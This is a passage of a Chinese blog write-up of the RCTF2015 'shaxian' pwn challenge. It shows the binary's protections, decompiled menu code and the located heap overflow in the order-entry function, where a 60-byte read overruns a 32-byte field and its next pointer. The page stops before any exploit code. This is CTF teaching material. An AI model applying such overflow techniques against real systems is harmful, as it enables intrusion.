<!DOCTYPE html>
<html lang="zh-Hans">
<head>

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->


<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="Sp4n9x" />
<meta name="renderer" content="webkit">
<meta name="google" value="notranslate">



<meta name="description" content="RCTF2015 Pwn题题解&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;——当你的才华还配不上你的野心时">
<meta name="keywords" content="CTF,Pwn">
<meta property="og:type" content="article">
<meta property="og:title" content="RCTF2015——WriteUp(Pwn)">
<meta property="og:url" content="http://sp4n9x.github.io/2020/07/19/RCTF2015——WriteUp(Pwn)/index.html">
<meta property="og:site_name" content="Sp4n9x&#39;s Blog">
<meta property="og:description" content="RCTF2015 Pwn题题解&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;——当你的才华还配不上你的野心时">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2020-10-03T07:43:15.097Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="RCTF2015——WriteUp(Pwn)">
<meta name="twitter:description" content="RCTF2015 Pwn题题解&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;——当你的才华还配不上你的野心时">

<link rel="apple-touch-icon" href= "/apple-touch-icon.png">


    <link rel="alternative" href="/atom.xml" title="Sp4n9x&#39;s Blog" type="application/atom+xml">



    <link rel="shortcut icon" href="/favicon.ico">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">



<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>RCTF2015——WriteUp(Pwn) | Sp4n9x&#39;s Blog</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>


    <script>
        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
    </script>



    <script> yiliaConfig.rootUrl = "\/";</script>





    <script>
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?48aad015dbbeb363812643fd03e528c5";
            var s = document.getElementsByTagName("script")[0]; 
            s.parentNode.insertBefore(hm, s);
        })();
    </script>


</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/avatar.png" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">Sp4n9x</a></h1>
        </hgroup>

        

        
            <form id="search-form">
            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
            <i class="fa fa-times" onclick="resetSearch()"></i>
            </form>
            <div id="local-search-result"></div>
            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">留言板</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto:sp4n9x@qq.com" title="Email"></a>
                            
                                <a class="fa 新浪微博" href="https://weibo.com/u/5721141892" title="新浪微博"></a>
                            
                                <a class="fa GitHub" href="https://github.com/Sp4n9x" title="GitHub"></a>
                            
                                <a class="fa 知乎" href="https://www.zhihu.com/people/pangx-cn/columns" title="知乎"></a>
                            
                                <a class="fa 网易云音乐" href="http://music.163.com/#/user/home?id=439043183" title="网易云音乐"></a>
                            
                            <!--
                            <div id="music163player">
                                <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=250 height=86 src="//music.163.com/outchain/player?type=2&id=535693399&auto=1&height=66">
                                </iframe>
                            </div>
                            -->
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AVI/">AVI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Adobe-Reader/">Adobe Reader</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cinepak/">Cinepak</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DNS隐蔽信道通信/">DNS隐蔽信道通信</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ELF/">ELF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FileFormat/">FileFormat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Got表覆写/">Got表覆写</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Heap/">Heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Heap-Overflow/">Heap Overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFH/">LFH</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Microsoft-Office/">Microsoft Office</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PEB/">PEB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pdf/">Pdf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rtf/">Rtf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SEH/">SEH</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Stack-Overflow/">Stack Overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/TEB/">TEB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ubuntu/">Ubuntu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/">Windows</a></li></ul>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" href="//moxfive.xyz/">MOxFIVE</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">Sp4n9x&#39;s 简介</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Sp4n9x</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/avatar.png" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">Sp4n9x</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">留言板</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:sp4n9x@qq.com" title="Email"></a>
                            
                                <a class="fa 新浪微博" target="_blank" href="https://weibo.com/u/5721141892" title="新浪微博"></a>
                            
                                <a class="fa GitHub" target="_blank" href="https://github.com/Sp4n9x" title="GitHub"></a>
                            
                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/pangx-cn/columns" title="知乎"></a>
                            
                                <a class="fa 网易云音乐" target="_blank" href="http://music.163.com/#/user/home?id=439043183" title="网易云音乐"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap"><article id="post-RCTF2015——WriteUp(Pwn)" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/07/19/RCTF2015——WriteUp(Pwn)/" class="article-date">
      <time datetime="2020-07-18T16:00:00.000Z" itemprop="datePublished">2020-07-19</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      RCTF2015——WriteUp(Pwn)
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/WriteUp/">WriteUp</a>
    </div>


        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/">Pwn</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
      
          
        <blockquote>
<p>RCTF2015 Pwn题题解<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;——当你的才华还配不上你的野心时，请静下来好好努力！<br><a id="more"></a></p>
</blockquote>
<h2 id="shaxian-pwn400"><a href="#shaxian-pwn400" class="headerlink" title="shaxian-pwn400"></a>shaxian-pwn400</h2><h3 id="0x00-检查程序开启的保护机制"><a href="#0x00-检查程序开启的保护机制" class="headerlink" title="0x00 检查程序开启的保护机制"></a>0x00 检查程序开启的保护机制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec shaxian</span><br><span class="line">[*] &apos;/home//Desktop/remote-dbg/shaxian&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;我们可以看到程序开启了<code>Partial RELRO</code>(部分重定位只读)，在这种情况下，<code>.dynamic段</code>是不可写的，<code>.got.plt段</code>(GOT表)是可写的。又开启了<code>Canary</code>检测是否有栈溢出，开启了<code>NX(DEP)</code>使堆栈上的代码不可执行。</p>
<h3 id="0x10-静态分析"><a href="#0x10-静态分析" class="headerlink" title="0x10 静态分析"></a>0x10 静态分析</h3><p>&emsp;&emsp;这是一个<code>32位</code>的<code>ELF</code>程序，我们通过IDA的反汇编功能对其反汇编并对函数名和变量名重命名后，<code>主函数</code>伪代码如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> choose; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">30u</span>);                                   <span class="comment">// 30秒的闹钟</span></span><br><span class="line">  close_buffer();</span><br><span class="line">  banner();</span><br><span class="line">  input_your_message();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    puts_menu();</span><br><span class="line">    choose = get_num();</span><br><span class="line">    <span class="keyword">if</span> ( choose == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( choose )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        Diancai();                              <span class="comment">// 1、点菜</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        Submit();                               <span class="comment">// 2、提交订单</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        Receipt();                              <span class="comment">// 3、收据信息</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        Review();                               <span class="comment">// 4、回顾</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:                                   <span class="comment">// 5、退出</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice!"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">input_your_message</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your Address:"</span>);</span><br><span class="line">  input_message(<span class="number">0</span>, (<span class="keyword">int</span>)&amp;Address_buf, <span class="number">256</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your Phone number:"</span>);</span><br><span class="line">  input_message(<span class="number">0</span>, (<span class="keyword">int</span>)&amp;Phone_number_buf, <span class="number">256</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Thank you."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">puts_menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1.WO YAO DIAN CAI"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2.Submit"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3.I want Receipt"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4.Review"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"5.Exit"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"choose:"</span>);</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;我们可以看到这是一个<code>菜单式</code>的交互程序。此程序的大致功能分为<code>5部分</code>：</p>
<blockquote>
<p>1、点菜。<br>2、提交订单。<br>3、索要收据。<br>4、查看购物车。<br>5、退出程序。</p>
</blockquote>
<p>&emsp;&emsp;在进入菜单前，程序会要求输入客户的信息：客户的<code>地址</code>和<code>电话</code>。这两个数据都存在<code>.bss段</code>上，大小均为<code>256字节</code>。</p>
<p>&emsp;&emsp;分析功能前，先看一下，用于存储订单信息的<code>购物车结构体</code>。此结构体拥有三个结构体成员。<code>count</code>：存储某种菜的数量。<code>food_type</code>：存储菜的名字。<code>next</code>：存储前一个购物车结构体的地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000000 shopping_cart_struct struc ; (sizeof=0x28, mappedto_5)                                  </span><br><span class="line">00000000 count           dd ?</span><br><span class="line">00000004 food_type       db 32 dup(?)</span><br><span class="line">00000024 next            dd ?</span><br><span class="line">00000028 shopping_cart_struct ends</span><br></pre></td></tr></table></figure></p>
<p>1、<code>点菜</code>：通过一个购物车结构体(shopping_cart_struct)的<code>单链表</code>，将用户输入的<code>菜的类型</code>和<code>数量</code>数据存储在<code>堆</code>中。<code>.bss段</code>上的head_ptr_0804B1C0变量为此单链表的<code>头指针</code>，也是最后所点的菜的信息结构体指针。其中使用<code>input_message()函数</code>读入菜的名字，存入<code>food_type</code>成员变量中。input_message()函数有<code>四个参数</code>，分别表示：文件描述符，缓冲区地址，最大读取长度，读取终止符(\n)。我们知道<code>food_type</code>只有<code>32字节</code>大小，而这里input_message()函数却可以最大读入<code>60字节</code>数据，这会造成<code>next指针</code>被覆盖，形成<code>堆溢出</code>。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Diancai</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  shopping_cart_struct *tmp_ptr; <span class="comment">// ebx</span></span><br><span class="line">  shopping_cart_struct *tmp_head_ptr; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  tmp_head_ptr = head_ptr_0804B1C0;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"CHI SHEN ME?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1.Banmian"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2.Bianrou"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3.Qingtangmian"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4.Jianbao"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"5.Jianjiao"</span>);</span><br><span class="line">  head_ptr_0804B1C0 = (shopping_cart_struct *)<span class="built_in">malloc</span>(<span class="number">40u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !head_ptr_0804B1C0 )                     <span class="comment">// buffer分配出错</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Error"</span>);</span><br><span class="line">  head_ptr_0804B1C0-&gt;next = (<span class="keyword">int</span>)tmp_head_ptr;</span><br><span class="line">  input_message(<span class="number">0</span>, (<span class="keyword">int</span>)head_ptr_0804B1C0-&gt;food_type, <span class="number">60</span>, <span class="number">10</span>);<span class="comment">// 漏洞点,堆溢出</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How many?"</span>);</span><br><span class="line">  tmp_ptr = head_ptr_0804B1C0;</span><br><span class="line">  tmp_ptr-&gt;count = get_num();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Add to GOUWUCHE"</span>);                      <span class="comment">// 购物车数量+1</span></span><br><span class="line">  <span class="keyword">return</span> shopping_cart++ + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">input_message</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> buf, <span class="keyword">int</span> max_len, <span class="keyword">int</span> Linefeed)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; max_len - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(fd, (<span class="keyword">void</span> *)(i + buf), <span class="number">1u</span>) &lt;= <span class="number">0</span> ) <span class="comment">// 读取发生错误</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(i + buf) == (_BYTE)Linefeed )<span class="comment">// LF == 0xA,换行符</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 返回正常读取的字节数</span></span><br><span class="line">  *(_BYTE *)(i + buf) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>2、<code>提交订单</code>：打印购物车中的订单信息，并将堆上用于存储菜的类型和数量数据的<code>堆块</code>进行<code>释放</code>。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Submit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  shopping_cart_struct *free_ptr; <span class="comment">// ST1C_4</span></span><br><span class="line">  shopping_cart_struct *tmp_head_ptr; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  tmp_head_ptr = head_ptr_0804B1C0;</span><br><span class="line">  <span class="keyword">if</span> ( !shopping_cart )                         <span class="comment">// 购物车为空</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"DIANCAI first"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( tmp_head_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    print_food_list(tmp_head_ptr);</span><br><span class="line">    free_ptr = tmp_head_ptr;</span><br><span class="line">    tmp_head_ptr = (shopping_cart_struct *)tmp_head_ptr-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(free_ptr);                             <span class="comment">// 释放结构体内存</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Your order has been submitted!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>3、<code>索要收据</code>：输入收据抬头信息。抬头信息也存储于<code>.bss段</code>。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Receipt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Taitou:"</span>);</span><br><span class="line">  input_message(<span class="number">0</span>, (<span class="keyword">int</span>)&amp;Title, <span class="number">256</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Taitou saved"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>4、<code>查看购物车</code>：通过购物车结构体(shopping_cart_struct)的<code>单链表</code>，<code>循环</code>将购物车中的订单内容打印出来。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Review</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  shopping_cart_struct *tmp_head_ptr; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  tmp_head_ptr = head_ptr_0804B1C0;</span><br><span class="line">  <span class="keyword">if</span> ( shopping_cart )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Cart:"</span>);</span><br><span class="line">    <span class="keyword">while</span> ( tmp_head_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%s * %d\n"</span>, tmp_head_ptr-&gt;food_type, tmp_head_ptr-&gt;count);</span><br><span class="line">      tmp_head_ptr = (shopping_cart_struct *)tmp_head_ptr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Total:%d\n"</span>, shopping_cart);</span><br><span class="line">  &#125;</span><br><span class="line">  